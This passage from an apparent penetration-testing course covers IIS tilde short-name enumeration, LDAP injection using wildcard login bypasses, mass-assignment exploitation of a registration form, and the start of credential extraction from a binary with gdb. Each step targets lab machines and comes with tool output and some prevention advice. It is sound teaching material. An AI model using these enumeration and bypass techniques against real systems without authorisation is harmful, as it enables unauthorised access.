|_http-server-<span class="hljs-string">header:</span> Microsoft-IIS/<span class="hljs-number">7.5</span>
|_http-<span class="hljs-string">title:</span> Bounty
Service <span class="hljs-string">Info:</span> <span class="hljs-string">OS:</span> Windows; <span class="hljs-string">CPE:</span> <span class="hljs-string">cpe:</span>/<span class="hljs-string">o:</span><span class="hljs-string">microsoft:</span>windows

Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">183.38</span> seconds
</code></pre>
<p>IIS 7.5 is running on port 80. Executing a tilde enumeration attack on this version could be a viable option.</p>
<p><strong>Tilde Enumeration using IIS ShortName Scanner</strong></p>
<p>Manually sending HTTP requests for each letter of the alphabet can be a tedious process. Fortunately, there is a tool called <code>IIS-ShortName-Scanner</code> that can automate this task. You can find it on GitHub at the following link: <a href="https://github.com/irsdl/IIS-ShortName-Scanner">IIS-ShortName-Scanner</a>. To use <code>IIS-ShortName-Scanner</code>, you will need to install Oracle Java on either Pwnbox or your local VM. Details can be found in the following link. <a href="https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/">How to Install Oracle Java</a></p>
<p>When you run the below command, it will prompt you for a proxy, just hit enter for No.</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ java -jar iis_shortname_scanner.jar <span class="hljs-number">0</span> <span class="hljs-number">5</span> http:<span class="hljs-comment">//10.129.204.231/</span>

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=<span class="hljs-keyword">on</span> -Dswing.aatext=<span class="hljs-keyword">true</span>
<span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> use proxy [Y=Yes, Anything <span class="hljs-keyword">Else</span>=No]? 
# IIS Short Name (<span class="hljs-number">8.3</span>) Scanner version <span class="hljs-number">2023.0</span> - scan initiated <span class="hljs-number">2023</span>/<span class="hljs-number">03</span>/<span class="hljs-number">23</span> <span class="hljs-number">15</span>:<span class="hljs-number">06</span>:<span class="hljs-number">57</span>
Target: http:<span class="hljs-comment">//10.129.204.231/</span>
|_ <span class="hljs-keyword">Result</span>: Vulnerable!
|_ Used HTTP <span class="hljs-function"><span class="hljs-keyword">method</span>:</span> OPTIONS
|_ Suffix (magic part): /~<span class="hljs-number">1</span>/
|_ Extra information:
  |_ Number <span class="hljs-keyword">of</span> sent requests: <span class="hljs-number">553</span>
  |_ Identified directories: <span class="hljs-number">2</span>
    |_ ASPNET~<span class="hljs-number">1</span>
    |_ UPLOAD~<span class="hljs-number">1</span>
  |_ Identified files: <span class="hljs-number">3</span>
    |_ CSASPX~<span class="hljs-number">1</span>.CS
      |_ Actual <span class="hljs-keyword">extension</span> = .CS
    |_ CSASPX~<span class="hljs-number">1</span>.CS??
    |_ TRANSF~<span class="hljs-number">1</span>.ASP
</code></pre>
<p>Upon executing the tool, it discovers 2 directories and 3 files. However, the target does not permit <code>GET</code> access to <code>http://10.129.204.231/TRANSF~1.ASP</code>, necessitating the brute-forcing of the remaining filename.</p>
<p><strong>Generate Wordlist</strong></p>
<p>The pwnbox image offers an extensive collection of wordlists located in the <code>/usr/share/wordlists/</code> directory, which can be utilised for this purpose.</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ egrep -r ^transf /usr</span><span class="hljs-regexp">/share/wordlists</span><span class="hljs-regexp">/ | sed 's/</span>^[^<span class="hljs-symbol">:</span>]*<span class="hljs-symbol">://<span class="hljs-string">' &gt; /tmp/list.txt</span></span>
</code></pre>
<p>This command combines <code>egrep</code> and <code>sed</code> to filter and modify the contents of input files, then save the results to a new file.</p>
<table data-header-hidden><thead><tr><th width="233"></th><th></th></tr></thead><tbody><tr><td><strong>Command Part</strong></td><td><strong>Description</strong></td></tr><tr><td><code>egrep -r ^transf</code></td><td>The <code>egrep</code> command is used to search for lines containing a specific pattern in the input files. The <code>-r</code> flag indicates a recursive search through directories. The <code>^transf</code> pattern matches any line that starts with &quot;transf&quot;. The output of this command will be lines that begin with &quot;transf&quot; along with their source file names.</td></tr><tr><td><code>|</code></td><td>The pipe symbol (<code>|</code>) is used to pass the output of the first command (<code>egrep</code>) to the second command (<code>sed</code>). In this case, the lines starting with &quot;transf&quot; and their file names will be the input for the <code>sed</code> command.</td></tr><tr><td><code>sed &#39;s/^[^:]<em>://&#39;</code></td><td>The <code>sed</code> command is used to perform a find-and-replace operation on its input (in this case, the output of <code>egrep</code>). The <code>&#39;s/^[^:]</em>://&#39;</code> expression tells <code>sed</code> to find any sequence of characters at the beginning of a line (<code>^</code>) up to the first colon (<code>:</code>), and replace them with nothing (effectively removing the matched text). The result will be the lines starting with &quot;transf&quot; but without the file names and colons.</td></tr><tr><td><code>&gt; /tmp/list.txt</code></td><td>The greater-than symbol (<code>&gt;</code>) is used to redirect the output of the entire command (i.e., the modified lines) to a new file named <code>/tmp/list.txt</code>.</td></tr></tbody></table>

<p><strong>Gobuster Enumeration</strong></p>
<p>Once you have created the custom wordlist, you can use <code>gobuster</code> to enumerate all items in the target. GoBuster is an open-source directory and file brute-forcing tool written in the Go programming language. It is designed for penetration testers and security professionals to help identify and discover hidden files, directories, or resources on web servers during security assessments.</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ gobuster dir -u http:/</span><span class="hljs-regexp">/10.129.204.231/</span> -w <span class="hljs-regexp">/tmp/</span>list.txt -x .aspx,.asp

===============================================================
Gobuster v3<span class="hljs-number">.5</span>
by OJ Reeves (<span class="hljs-meta">@TheColonial</span>) &amp; Christian Mehlmauer (<span class="hljs-meta">@firefart</span>)
===============================================================
[+] <span class="hljs-string">Url:</span>                     <span class="hljs-string">http:</span><span class="hljs-comment">//10.129.204.231/</span>
[+] <span class="hljs-string">Method:</span>                  GET
[+] <span class="hljs-string">Threads:</span>                 <span class="hljs-number">10</span>
[+] <span class="hljs-string">Wordlist:</span>                <span class="hljs-regexp">/tmp/</span>list.txt
[+] Negative Status <span class="hljs-string">codes:</span>   <span class="hljs-number">404</span>
[+] User <span class="hljs-string">Agent:</span>              gobuster/<span class="hljs-number">3.5</span>
[+] <span class="hljs-string">Extensions:</span>              asp,aspx
[+] <span class="hljs-string">Timeout:</span>                 <span class="hljs-number">10</span>s
===============================================================
<span class="hljs-number">2023</span><span class="hljs-regexp">/03/</span><span class="hljs-number">23</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span>:<span class="hljs-number">05</span> Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode
===============================================================
/transf**.aspx        (<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">941</span>]
<span class="hljs-string">Progress:</span> <span class="hljs-number">306</span> / <span class="hljs-number">309</span> (<span class="hljs-number">99.03</span>%)
===============================================================
<span class="hljs-number">2023</span><span class="hljs-regexp">/03/</span><span class="hljs-number">23</span> <span class="hljs-number">15</span>:<span class="hljs-number">14</span>:<span class="hljs-number">11</span> Finished
===============================================================
</code></pre>
<p>From the redacted output, you can see that <code>gobuster</code> has successfully identified an <code>.aspx</code> file as the full filename corresponding to the previously discovered short name <code>TRANSF~1.ASP</code>.</p>
<h2 id="ldap">LDAP</h2>
<hr>
<p><code>LDAP</code> (Lightweight Directory Access Protocol) is <code>a protocol</code> used to <code>access and manage directory information</code>. A <code>directory</code> is a <code>hierarchical data store</code> that contains information about network resources such as <code>users</code>, <code>groups</code>, <code>computers</code>, <code>printers</code>, and other devices. LDAP provides some excellent functionality:</p>
<table data-header-hidden><thead><tr><th width="285"></th><th></th></tr></thead><tbody><tr><td><strong>Functionality</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Efficient</code></td><td>Efficient and fast queries and connections to directory services, thanks to its lean query language and non-normalised data storage.</td></tr><tr><td><code>Global naming model</code></td><td>Supports multiple independent directories with a global naming model that ensures unique entries.</td></tr><tr><td><code>Extensible and flexible</code></td><td>This helps to meet future and local requirements by allowing custom attributes and schemas.</td></tr><tr><td><code>Compatibility</code></td><td>It is compatible with many software products and platforms as it runs over TCP/IP and SSL directly, and it is <code>platform-independent</code>, suitable for use in heterogeneous environments with various operating systems.</td></tr><tr><td><code>Authentication</code></td><td>It provides <code>authentication</code> mechanisms that enable users to <code>sign on once</code> and access multiple resources on the server securely.</td></tr></tbody></table>

<p>However, it also suffers some significant issues:</p>
<table><thead><tr><th width="183">Functionality</th><th>Description</th></tr></thead><tbody><tr><td><code>Compliance</code></td><td>Directory servers <code>must be LDAP compliant</code> for service to be deployed, which may <code>limit the choice</code> of vendors and products.</td></tr><tr><td><code>Complexity</code></td><td><code>Difficult to use and understand</code> for many developers and administrators, who may not know how to configure LDAP clients correctly or use it securely.</td></tr><tr><td><code>Encryption</code></td><td>LDAP <code>does not encrypt its traffic by default</code>, which exposes sensitive data to potential eavesdropping and tampering. LDAPS (LDAP over SSL) or StartTLS must be used to enable encryption.</td></tr><tr><td><code>Injection</code></td><td><code>Vulnerable to LDAP injection attacks</code>, where malicious users can manipulate LDAP queries and <code>gain unauthorised access</code> to data or resources. To prevent such attacks, input validation and output encoding must be implemented.</td></tr></tbody></table>

<p>LDAP is <code>commonly used</code> for providing a <code>central location</code> for <code>accessing</code> and <code>managing</code> directory services. Directory services are collections of information about the organisation, its users, and assets–like usernames and passwords. LDAP enables organisations to store, manage, and secure this information in a standardised way. Here are some common use cases:</p>
<table data-header-hidden><thead><tr><th width="239"></th><th></th></tr></thead><tbody><tr><td><strong>Use Case</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Authentication</code></td><td>LDAP can be used for <code>central authentication</code>, allowing users to have single login credentials across multiple applications and systems. This is one of the most common use cases for LDAP.</td></tr><tr><td><code>Authorisation</code></td><td>LDAP can <code>manage permissions</code> and <code>access control</code> for network resources such as folders or files on a network share. However, this may require additional configuration or integration with protocols like Kerberos.</td></tr><tr><td><code>Directory Services</code></td><td>LDAP provides a way to <code>search</code>, <code>retrieve</code>, and <code>modify data</code> stored in a directory, making it helpful for managing large numbers of users and devices in a corporate network. <code>LDAP is based on the X.500 standard</code> for directory services.</td></tr><tr><td><code>Synchronisation</code></td><td>LDAP can be used to <code>keep data consistent</code> across multiple systems by <code>replicating changes</code> made in one directory to another.</td></tr></tbody></table>

<p>There are two popular implementations of LDAP: <code>OpenLDAP</code>, an open-source software widely used and supported, and <code>Microsoft Active Directory</code>, a Windows-based implementation that seamlessly integrates with other Microsoft products and services.</p>
<p>Although LDAP and AD are <code>related</code>, they <code>serve different purposes</code>. <code>LDAP</code> is a <code>protocol</code> that specifies the method of accessing and modifying directory services, whereas <code>AD</code> is a <code>directory service</code> that stores and manages user and computer data. While LDAP can communicate with AD and other directory services, it is not a directory service itself. AD offers extra functionalities such as policy administration, single sign-on, and integration with various Microsoft products.</p>
<table>
<thead>
<tr>
<th><strong>LDAP</strong></th>
<th><strong>Active Directory (AD)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>A <code>protocol</code> that defines how clients and servers communicate with each other to access and manipulate data stored in a directory service.</td>
<td>A <code>directory server</code> that uses LDAP as one of its protocols to provide authentication, authorisation, and other services for Windows-based networks.</td>
</tr>
<tr>
<td>An <code>open and cross-platform protocol</code> that can be used with different types of directory servers and applications.</td>
<td><code>Proprietary software</code> that only works with Windows-based systems and requires additional components such as DNS (Domain Name System) and Kerberos for its functionality.</td>
</tr>
<tr>
<td>It has a <code>flexible and extensible schema</code> that allows custom attributes and object classes to be defined by administrators or developers.</td>
<td>It has a <code>predefined schema</code> that follows and extends the X.500 standard with additional object classes and attributes specific to Windows environments. Modifications should be made with caution and care.</td>
</tr>
<tr>
<td>Supports <code>multiple authentication mechanisms</code> such as simple bind, SASL, etc.</td>
<td>It supports <code>Kerberos</code> as its primary authentication mechanism but also supports NTLM (NT LAN Manager) and LDAP over SSL/TLS for backward compatibility.</td>
</tr>
</tbody>
</table>
<p>LDAP works by using a <code>client-server architecture</code>. A client sends an LDAP request to a server, which searches the directory service and returns a response to the client. LDAP is a protocol that is simpler and more efficient than X.500, on which it is based. It uses a client-server model, where clients send requests to servers using LDAP messages encoded in ASN.1 (Abstract Syntax Notation One) and transmitted over TCP/IP (Transmission Control Protocol/Internet Protocol). The servers process the requests and send back responses using the same format. LDAP supports various requests, such as <code>bind</code>, <code>unbind</code>, <code>search</code>, <code>compare</code>, <code>add</code>, <code>delete</code>, <code>modify</code>, etc.</p>
<p><code>LDAP requests</code> are <code>messages</code> that clients send to servers to <code>perform operations</code> on data stored in a directory service. An LDAP request is comprised of several components:</p>
<ol>
<li><code>Session connection</code>: The client connects to the server via an LDAP port (usually 389 or 636).</li>
<li><code>Request type</code>: The client specifies the operation it wants to perform, such as <code>bind</code>, <code>search</code>, etc.</li>
<li><code>Request parameters</code>: The client provides additional information for the request, such as the <code>distinguished name</code> (DN) of the entry to be accessed or modified, the scope and filter of the search query, the attributes and values to be added or changed, etc.</li>
<li><code>Request ID</code>: The client assigns a unique identifier for each request to match it with the corresponding response from the server.</li>
</ol>
<p>Once the server receives the request, it processes it and sends back a response message that includes several components:</p>
<ol>
<li><code>Response type</code>: The server indicates the operation that was performed in response to the request.</li>
<li><code>Result code</code>: The server indicates whether or not the operation was successful and why.</li>
<li><code>Matched DN:</code> If applicable, the server returns the DN of the closest existing entry that matches the request.</li>
<li><code>Referral</code>: The server returns a URL of another server that may have more information about the request, if applicable.</li>
<li><code>Response data</code>: The server returns any additional data related to the response, such as the attributes and values of an entry that was searched or modified.</li>
</ol>
<p>After receiving and processing the response, the client disconnects from the LDAP port.</p>
<p><strong>ldapsearch</strong></p>
<p>For example, <code>ldapsearch</code> is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service.</p>
<p>LDAP</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ldapsearch -H ldap:/</span>/ldap.example.<span class="hljs-string">com:</span><span class="hljs-number">389</span> -D <span class="hljs-string">"cn=admin,dc=example,dc=com"</span> -w secret123 -b <span class="hljs-string">"ou=people,dc=example,dc=com"</span> <span class="hljs-string">"(mail=john.doe@example.com)"</span>
</code></pre>
<p>This command can be broken down as follows:</p>
<ul>
<li>Connect to the server <code>ldap.example.com</code> on port <code>389</code>.</li>
<li>Bind (authenticate) as <code>cn=admin,dc=example,dc=com</code> with password <code>secret123</code>.</li>
<li>Search under the base DN <code>ou=people,dc=example,dc=com</code>.</li>
<li>Use the filter <code>(mail=john.doe@example.com)</code> to find entries that have this email address.</li>
</ul>
<p>The server would process the request and send back a response, which might look something like this:</p>
<p>Code: ldap</p>
<pre><code class="lang-ldap"><span class="hljs-attribute">dn</span>: uid=jdoe,ou=people,dc=example,dc=com
<span class="hljs-attribute">objectClass</span>: inetOrgPerson
<span class="hljs-attribute">objectClass</span>: organizationalPerson
<span class="hljs-attribute">objectClass</span>: person
<span class="hljs-attribute">objectClass</span>: top
<span class="hljs-attribute">cn</span>: John Doe
<span class="hljs-attribute">sn</span>: Doe
<span class="hljs-attribute">uid</span>: jdoe
<span class="hljs-attribute">mail</span>: john.doe@example.com

<span class="hljs-attribute">result</span>: 0 Success
</code></pre>
<p>This response includes the entry&#39;s <code>distinguished name (DN)</code> that matches the search criteria and its attributes and values.</p>
<hr>
<h3 id="ldap-injection">LDAP Injection</h3>
<p><code>LDAP injection</code> is an attack that <code>exploits web applications that use LDAP</code> (Lightweight Directory Access Protocol) for authentication or storing user information. The attacker can <code>inject malicious code</code> or <code>characters</code> into LDAP queries to alter the application&#39;s behaviour, <code>bypass security measures</code>, and <code>access sensitive data</code> stored in the LDAP directory.</p>
<p>To test for LDAP injection, you can use input values that contain <code>special characters or operators</code> that can change the query&#39;s meaning:</p>
<table><thead><tr><th width="127">Input</th><th>Description</th></tr></thead><tbody><tr><td><code><em></code></td><td>An asterisk <code></em></code> can <code>match any number of characters</code>.</td></tr><tr><td><code>( )</code></td><td>Parentheses <code>( )</code> can <code>group expressions</code>.</td></tr><tr><td><code>|</code></td><td>A vertical bar <code>|</code> can perform <code>logical OR</code>.</td></tr><tr><td><code>&#x26;</code></td><td>An ampersand <code>&#x26;</code> can perform <code>logical AND</code>.</td></tr><tr><td><code>(cn=<em>)</code></td><td>Input values that try to bypass authentication or authorisation checks by injecting conditions that <code>always evaluate to true</code> can be used. For example, <code>(cn=</em>)</code> or <code>(objectClass=*)</code> can be used as input values for a username or password fields.</td></tr></tbody></table>

<p>LDAP injection attacks are <code>similar to SQL injection attacks</code> but target the LDAP directory service instead of a database.</p>
<p>For example, suppose an application uses the following LDAP query to authenticate users:</p>
<pre><code class="lang-php">(<span class="hljs-name">&amp;</span>(<span class="hljs-name">objectClass=user</span>)(<span class="hljs-name">sAMAccountName=</span>$username)(<span class="hljs-name">userPassword=</span>$password))
</code></pre>
<p>In this query, <code>$username</code> and <code>$password</code> contain the user&#39;s login credentials. An attacker could inject the <code>*</code> character into the <code>$username</code> or <code>$password</code> field to modify the LDAP query and bypass authentication.</p>
<p>If an attacker injects the <code>*</code> character into the <code>$username</code> field, the LDAP query will match any user account with any password. This would allow the attacker to gain access to the application with any password, as shown below:</p>
<pre><code class="lang-php"><span class="hljs-variable">$username</span> = <span class="hljs-string">"*"</span>;
<span class="hljs-variable">$password</span> = <span class="hljs-string">"dummy"</span>;
(&amp;(objectClass=<span class="hljs-keyword">user</span>)(sAMAccountName=<span class="hljs-variable">$username</span>)(<span class="hljs-keyword">user</span>Password=<span class="hljs-variable">$password</span>))
</code></pre>
<p>Alternatively, if an attacker injects the <code>*</code> character into the <code>$password</code> field, the LDAP query would match any user account with any password that contains the injected string. This would allow the attacker to gain access to the application with any username, as shown below:</p>
<pre><code class="lang-php"><span class="hljs-variable">$username</span> = <span class="hljs-string">"dummy"</span>;
<span class="hljs-variable">$password</span> = <span class="hljs-string">"*"</span>;
(&amp;(objectClass=<span class="hljs-keyword">user</span>)(sAMAccountName=<span class="hljs-variable">$username</span>)(<span class="hljs-keyword">user</span>Password=<span class="hljs-variable">$password</span>))
</code></pre>
<p>LDAP injection attacks can lead to <code>severe consequences</code>, such as <code>unauthorised access</code> to sensitive information, <code>elevated privileges</code>, and even <code>full control over the affected application or server</code>. These attacks can also considerably impact data integrity and availability, as attackers may <code>alter or remove data</code> within the directory service, causing disruptions to applications and services dependent on that data.</p>
<p>To mitigate the risks associated with LDAP injection attacks, it is crucial to <code>thoroughly validate</code> and <code>sanitize user input</code> before incorporating it into LDAP queries. This process should involve <code>removing LDAP-specific special characters</code> like <code>*</code> and <code>employing parameterised queries</code> to ensure user input is <code>treated solely as data</code>, not executable code.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>Enumerating the target helps us to understand services and exposed ports. An <code>nmap</code> services scan is a type of network scanning technique used to identify and analyze the services running on a target system or network. By probing open ports and assessing the responses, nmap is able to deduce which services are active and their respective versions. The scan provides valuable information about the target&#39;s network infrastructure, and potential vulnerabilities and attack surfaces.</p>
<p><strong>nmap</strong></p>
<p>LDAP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">p</span>- -sC -sV --<span class="hljs-keyword">open</span> --<span class="hljs-built_in">min</span>-rate=<span class="hljs-number">1000</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">204.229</span>

Starting Nmap <span class="hljs-number">7.93</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">23</span> <span class="hljs-number">14</span>:<span class="hljs-number">43</span> SAST
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">204.229</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.18</span>s latency).
Not shown: <span class="hljs-number">65533</span> filtered tcp ports (<span class="hljs-keyword">no</span>-response)
Some closed ports may <span class="hljs-keyword">be</span> reported <span class="hljs-keyword">as</span> filtered due <span class="hljs-keyword">to</span> --defeat-rst-ratelimit
PORT    STATE SERVICE VERSION
<span class="hljs-number">80</span>/tcp  <span class="hljs-keyword">open</span>  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))
|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)
| http-cookie-flag<span class="hljs-variable">s:</span> 
|   /: 
|     PHPSESSID: 
|_      httponly flag not <span class="hljs-keyword">set</span>
|_http-title: Login
<span class="hljs-number">389</span>/tcp <span class="hljs-keyword">open</span>  ldap    OpenLDAP <span class="hljs-number">2.2</span>.<span class="hljs-keyword">X</span> - <span class="hljs-number">2.3</span>.<span class="hljs-keyword">X</span>

Service detection performed. Please report any incorrect results at http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">149.73</span> seconds
</code></pre>
<p>nmap detects a <code>http</code> server running on port <code>80</code> and an <code>ldap</code> server running on port <code>389</code></p>
<p><strong>Injection</strong></p>
<p>As <code>OpenLDAP</code> runs on the server, it is safe to assume that the web application running on port <code>80</code> uses LDAP for authentication.</p>
<p>Attempting to log in using a wildcard character (<code>*</code>) in the username and password fields grants access to the system, effectively <code>bypassing any authentication measures that had been implemented</code>. This is a <code>significant</code> security issue as it allows anyone with knowledge of the vulnerability to <code>gain unauthorised access</code> to the system and potentially sensitive data.</p>
<h2 id="web-mass-assignment-vulnerabilities">Web Mass Assignment Vulnerabilities</h2>
<hr>
<p>Several frameworks offer handy mass-assignment features to lessen the workload for developers. Because of this, programmers can directly insert a whole set of user-entered data from a form into an object or database. This feature is often used without a whitelist for protecting the fields from the user&#39;s input. This vulnerability could be used by an attacker to steal sensitive information or destroy data.</p>
<p>Web mass assignment vulnerability is a type of security vulnerability where attackers can modify the model attributes of an application through the parameters sent to the server. Reversing the code, attackers can see these parameters and by assigning values to critical unprotected parameters during the HTTP request, they can edit the data of a database and change the intended functionality of an application.</p>
<p>Ruby on Rails is a web application framework that is vulnerable to this type of attack. The following example shows how attackers can exploit mass assignment vulnerability in Ruby on Rails. Assuming we have a <code>User</code> model with the following attributes:</p>
<p>Code: ruby</p>
<pre><code class="lang-ruby"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> &lt; ActiveRecord::Base</span>
  attr_accessible <span class="hljs-symbol">:username</span>, <span class="hljs-symbol">:email</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>The above model specifies that only the <code>username</code> and <code>email</code> attributes are allowed to be mass-assigned. However, attackers can modify other attributes by tampering with the parameters sent to the server. Let&#39;s assume that the server receives the following parameters.</p>
<p>Code: javascript</p>
<pre><code class="lang-javascript">{ <span class="hljs-string">"user"</span> =&gt; { <span class="hljs-string">"username"</span> =&gt; <span class="hljs-string">"hacker"</span>, <span class="hljs-string">"email"</span> =&gt; <span class="hljs-string">"hacker@example.com"</span>, <span class="hljs-string">"admin"</span> =&gt; <span class="hljs-keyword">true</span> } }
</code></pre>
<p>Although the <code>User</code> model does not explicitly state that the <code>admin</code> attribute is accessible, the attacker can still change it because it is present in the arguments. Bypassing any access controls that may be in place, the attacker can send this data as part of a POST request to the server to establish a user with admin privileges.</p>
<hr>
<h3 id="exploiting-mass-assignment-vulnerability">Exploiting Mass Assignment Vulnerability</h3>
<p>Suppose we come across the following application that features an Asset Manager web application. Also suppose that the application&#39;s source code has been provided to us. Completing the registration step, we get the message <code>Success!!</code>, and we can try to log in.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/mass\_assignment/pending.png" alt="pending"></p>
<p>After login in, we get the message <code>Account is pending approval</code>. The administrator of this web app must approve our registration. Reviewing the python code of the <code>/opt/asset-manager/app.py</code> file reveals the following snippet.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">for</span> i,j,k <span class="hljs-keyword">in</span> cur.execute(<span class="hljs-symbol">'select</span> * from users where username=? <span class="hljs-keyword">and</span> password=?',(username,password)):
  <span class="hljs-keyword">if</span> k:
    session[<span class="hljs-symbol">'user</span>']=i
    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">"/home"</span>,code=<span class="hljs-number">302</span>)
  <span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-symbol">'login.html</span>',value=<span class="hljs-symbol">'Account</span> <span class="hljs-keyword">is</span> pending <span class="hljs-keyword">for</span> approval')
</code></pre>
<p>We can see that the application is checking if the value <code>k</code> is set. If yes, then it allows the user to log in. In the code below, we can also see that if we set the <code>confirmed</code> parameter during registration, then it inserts <code>cond</code> as <code>True</code> and allows us to bypass the registration checking step.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">try</span>:
  <span class="hljs-keyword">if</span> request.form[<span class="hljs-string">'confirmed'</span>]:
    cond=True
excep<span class="hljs-variable">t:</span>
      cond=False
with sqlite3.connect(<span class="hljs-string">"database.db"</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">con</span>:
  cur = <span class="hljs-keyword">con</span>.<span class="hljs-built_in">cursor</span>()
  cur.<span class="hljs-keyword">execute</span>(<span class="hljs-string">'select * from users where username=?'</span>,(username,))
  <span class="hljs-keyword">if</span> cur.fetchone():
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>,value=<span class="hljs-string">'User exists!!'</span>)
  <span class="hljs-keyword">else</span>:
    cur.<span class="hljs-keyword">execute</span>(<span class="hljs-string">'insert into users values(?,?,?)'</span>,(username,password,cond))
    <span class="hljs-keyword">con</span>.commit()
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>,value=<span class="hljs-string">'Success!!'</span>)
</code></pre>
<p>In that case, what we should try is to register another user and try setting the <code>confirmed</code> parameter to a random value. Using Burp Suite, we can capture the HTTP POST request to the <code>/register</code> page and set the parameters <code>username=new&amp;password=test&amp;confirmed=test</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/mass\_assignment/mass\_hidden.png" alt="mass\_hidden"></p>
<p>We can now try to log in to the application using the <code>new:test</code> credentials.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/mass\_assignment/loggedin.png" alt="loggedin"></p>
<p>The mass assignment vulnerability is exploited successfully and we are now logged into the web app without waiting for the administrator to approve our registration request.</p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>To prevent this type of attack, one should explicitly assign the attributes for the allowed fields, or use whitelisting methods provided by the framework to check the attributes that can be mass-assigned. The following example shows how to use strong parameters in the <code>User</code> controller.</p>
<p>Code: ruby</p>
<pre><code class="lang-ruby"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UsersController</span> &lt; ApplicationController</span>
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span></span>
    @user = User.new(user_params)
    <span class="hljs-keyword">if</span> @user.save
      redirect_to @user
    <span class="hljs-keyword">else</span>
      render <span class="hljs-string">'new'</span>
    <span class="hljs-keyword">end</span>
  <span class="hljs-keyword">end</span>

  private

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user_params</span></span>
    params.<span class="hljs-keyword">require</span>(<span class="hljs-symbol">:user</span>).permit(<span class="hljs-symbol">:username</span>, <span class="hljs-symbol">:email</span>)
  <span class="hljs-keyword">end</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>In the example above, the <code>user_params</code> method returns a new hash that includes only the <code>username</code> and <code>email</code> attributes, ignoring any more input the client may have sent. By doing this, we ensure that only explicitly permitted attributes can be changed by mass assignment.</p>
<h2 id="attacking-applications-connecting-to-services">Attacking Applications Connecting to Services</h2>
<hr>
<p>Applications that are connected to services often include connection strings that can be leaked if they are not protected sufficiently. In the following paragraphs, we will go through the process of enumerating and exploiting applications that are connected to other services in order to extend their functionality. This can help us collect information and move laterally or escalate our privileges during penetration testing.</p>
<hr>
<h3 id="elf-executable-examination">ELF Executable Examination</h3>
<p>The <code>octopus_checker</code> binary is found on a remote machine during the testing. Running the application locally reveals that it connects to database instances in order to verify that they are available.</p>
<p>Attacking Applications Connecting to Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./octopus_checker 

Program had started..
Attempting Connection 
Connecting ... 

The driver reported the following diagnostics whilst running SQLDriverConnect

01000:1:0:[<span class="hljs-string">unixODBC</span>][<span class="hljs-symbol">Driver Manager</span>]Can't open lib 'ODBC Driver 17 for SQL Server' : file not found
connected
</code></pre>
<p>The binary probably connects using a SQL connection string that contains credentials. Using tools like <a href="https://github.com/longld/peda">PEDA</a> (Python Exploit Development Assistance for GDB) we can further examine the file. This is an extension of the standard GNU Debugger (GDB), which is used for debugging C and C++ programs. GDB is a command line tool that lets you step through the code, set breakpoints, and examine and change variables. Running the following command we can execute the binary through it.</p>
<p>Attacking Applications Connecting to Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ gdb ./octopus_checker

GNU gdb (Debian <span class="hljs-number">9.2</span>-<span class="hljs-number">1</span>) <span class="hljs-number">9.2</span>
Copyright (C) <span class="hljs-number">2020</span> Free Software Foundation, Inc.
License GPLv3+: GNU GPL version <span class="hljs-number">3</span> <span class="hljs-built_in">or</span> later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span>
This is free software: you are free <span class="hljs-keyword">to</span> change <span class="hljs-built_in">and</span> redistribute it.
